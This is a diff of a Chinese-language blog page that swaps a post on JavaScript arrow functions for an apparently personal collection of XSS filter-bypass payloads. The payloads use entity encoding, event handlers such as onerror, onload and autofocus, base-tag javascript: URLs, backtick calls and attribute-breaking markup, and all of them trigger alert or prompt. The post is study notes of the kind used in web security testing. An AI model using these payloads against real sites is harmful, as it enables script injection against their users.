@@ -4,26 +4,41 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>js_arrow function | A1exlism</title>
+    <title>xss_收集_1 | A1exlism</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="A1ex">
     
 
     
-    <meta name="description" content="箭头函数函数式编程~简写的函数表达式
-例子1234567891011121314var a1 = [  &apos;ab&apos;,  &apos;cde&apos;,  &apos;fghi&apos;];var a2 = a1.map(function(arr)&amp;#123;  return arr.length;&amp;#125;)var a3 = a1.map( arr =&amp;gt; arr.length );console.log(a2+&apos;\n&apos;+a3)">
+    <meta name="description" content="记录碰到过的XSS序号乱了,算了
+
+()=被过滤   实体编码
+
+123&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40/1/&amp;amp;#41&amp;lt;/script&amp;gt;      // Works With All Browsers( is html encoded to &amp;amp;#40) is html encoded to &amp;amp;#41
+
+浏览器Prasi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="js_arrow function">
-<meta property="og:url" content="http://a1ex.net/04/12/2016/js-arrow-func/index.html">
+<meta property="og:title" content="xss_收集_1">
+<meta property="og:url" content="http://a1ex.net/05/03/2016/xss-2/index.html">
 <meta property="og:site_name" content="A1exlism">
-<meta property="og:description" content="箭头函数函数式编程~简写的函数表达式
-例子1234567891011121314var a1 = [  &apos;ab&apos;,  &apos;cde&apos;,  &apos;fghi&apos;];var a2 = a1.map(function(arr)&amp;#123;  return arr.length;&amp;#125;)var a3 = a1.map( arr =&amp;gt; arr.length );console.log(a2+&apos;\n&apos;+a3)">
-<meta property="og:updated_time" content="2016-04-12T03:05:57.435Z">
+<meta property="og:description" content="记录碰到过的XSS序号乱了,算了
+
+()=被过滤   实体编码
+
+123&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40/1/&amp;amp;#41&amp;lt;/script&amp;gt;      // Works With All Browsers( is html encoded to &amp;amp;#40) is html encoded to &amp;amp;#41
+
+浏览器Prasi">
+<meta property="og:updated_time" content="2016-05-03T07:56:50.717Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="js_arrow function">
-<meta name="twitter:description" content="箭头函数函数式编程~简写的函数表达式
-例子1234567891011121314var a1 = [  &apos;ab&apos;,  &apos;cde&apos;,  &apos;fghi&apos;];var a2 = a1.map(function(arr)&amp;#123;  return arr.length;&amp;#125;)var a3 = a1.map( arr =&amp;gt; arr.length );console.log(a2+&apos;\n&apos;+a3)">
+<meta name="twitter:title" content="xss_收集_1">
+<meta name="twitter:description" content="记录碰到过的XSS序号乱了,算了
+
+()=被过滤   实体编码
+
+123&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;alert&amp;amp;#40/1/&amp;amp;#41&amp;lt;/script&amp;gt;      // Works With All Browsers( is html encoded to &amp;amp;#40) is html encoded to &amp;amp;#41
+
+浏览器Prasi">
 <link rel="publisher" href="106896526077043222500">
 
     
@@ -80,14 +95,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/04/12/2016/js-arrow-func/" title="js_arrow function" itemprop="url">js_arrow function</a>
+      <a href="/05/03/2016/xss-2/" title="xss_收集_1" itemprop="url">xss_收集_1</a>
   </h1>
   <p class="article-author">By
        
 		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
 		
   <p class="article-time">
-    <time datetime="2016-04-11T16:00:00.000Z" itemprop="datePublished"> 发表于 04-12-2016</time>
+    <time datetime="2016-05-02T16:00:00.000Z" itemprop="datePublished"> 发表于 05-03-2016</time>
     
   </p>
 </header>
@@ -96,19 +111,64 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#箭头函数"><span class="toc-number">1.</span> <span class="toc-text">箭头函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">2.</span> <span class="toc-text">例子</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#记录碰到过的XSS"><span class="toc-number">1.</span> <span class="toc-text">记录碰到过的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#部分Reference"><span class="toc-number">2.</span> <span class="toc-text">部分Reference</span></a></li></ol>
 		
 		</div>
 		
-		<h3 id="箭头函数">箭头函数</h3><p>函数式编程~<br>简写的函数表达式</p>
-<h3 id="例子">例子</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = [</span><br><span class="line">  <span class="string">'ab'</span>,</span><br><span class="line">  <span class="string">'cde'</span>,</span><br><span class="line">  <span class="string">'fghi'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a2 = a1.map(<span class="function"><span class="keyword">function</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.length;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a3 = a1.map( arr =&gt; arr.length );</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a2+<span class="string">'\n'</span>+a3);</span><br><span class="line"><span class="comment">//  2,3,4 \n 2,3,4</span></span><br></pre></td></tr></table></figure>  
+		<h2 id="记录碰到过的XSS">记录碰到过的XSS</h2><p>序号乱了,算了</p>
+<ol>
+<li>()=被过滤   <svg>实体编码</svg></li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;<span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="cal">alert&amp;<span class="string">#40</span>/<span class="number">1</span>/&amp;<span class="string">#41</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>      // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>浏览器Prasing 先闭合再找新标签</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">value</span>=<span class="value">'&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">value</span>=<span class="value">"'输出点'"</span> <span class="attribute">type</span>=<span class="value">"text"</span>&gt;</span></span><br><span class="line">XSS_payload=  "type=&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101; src onerror</span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>x————-onerror和=之间换行仍然可以解析,—————可以绕过正则————-</p>
+<ol>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">autofocus</span>=<span class="value">alert(</span>/<span class="attribute">xss</span>/)&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>chrome base标签,不可覆盖 </p>
+</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">base</span> <span class="attribute">href</span>=<span class="value">"javascript:\"</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"//%0aalert(1);//"</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="title">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>img source可分开写</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">picture</span>&gt;</span><span class="tag">&lt;<span class="title">source</span> <span class="attribute">srcset</span>=<span class="value">1</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>————————ES6 神招 backtick ` 直接代替()——————————</strong></li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="autohotkey">alert<span class="escape">`1</span>`</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li>Chrome Only</li>
+</ol>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> ?<span class="attribute">itworksonchrome</span>?\/<span class="attribute">onerror</span> = <span class="attribute">alert</span>(<span class="attribute">1</span>)&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="title">img</span>/<span class="attribute">src</span>/<span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>13.</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">onload</span>=<span class="value">alert</span>/**/(<span class="attribute">1</span>)&gt;</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">svg</span> <span class="attribute">onload</span>=<span class="value">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>JS中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">)() <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">alert</span><br><span class="line">(<span class="number">1</span>) <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">aler</span><br><span class="line">t(<span class="number">1</span>) <span class="comment">//aler Not defined</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>img利用 </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onerror='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="部分Reference">部分Reference</h2><p><a href="http://lcx.cc/?i=4427" target="_blank" rel="external">核总</a><br><a href="http://www.cnblogs.com/hookjoy/p/3612044.html" target="_blank" rel="external">hookjoy</a></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://a1ex.net/04/12/2016/js-arrow-func/" data-title="js_arrow function | A1exlism" data-tsina="null" class="share clearfix">
+	  <div data-url="http://a1ex.net/05/03/2016/xss-2/" data-title="xss_收集_1 | A1exlism" data-tsina="null" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -121,19 +181,11 @@
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/04/19/2016/xss-1/" title="xss习题集_1">
-  <strong>上一篇：</strong><br/>
-  <span>
-  xss习题集_1</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/04/12/2016/js-let/"  title="ES6-JS的块级作用域">
+<a href="/04/24/2016/daily2/"  title="linux日常更新-02">
  <strong>下一篇：</strong><br/> 
- <span>ES6-JS的块级作用域
+ <span>linux日常更新-02
 </span>
 </a>
 </div>
@@ -142,7 +194,7 @@
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="04/12/2016/js-arrow-func/" data-title="js_arrow function" data-url="http://a1ex.net/04/12/2016/js-arrow-func/"></div>
+	<div class="ds-thread" data-thread-key="05/03/2016/xss-2/" data-title="xss_收集_1" data-url="http://a1ex.net/05/03/2016/xss-2/"></div>
 </section>
 
 
@@ -152,7 +204,7 @@
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#箭头函数"><span class="toc-number">1.</span> <span class="toc-text">箭头函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#例子"><span class="toc-number">2.</span> <span class="toc-text">例子</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#记录碰到过的XSS"><span class="toc-number">1.</span> <span class="toc-text">记录碰到过的XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#部分Reference"><span class="toc-number">2.</span> <span class="toc-text">部分Reference</span></a></li></ol>
  
   </div>
 
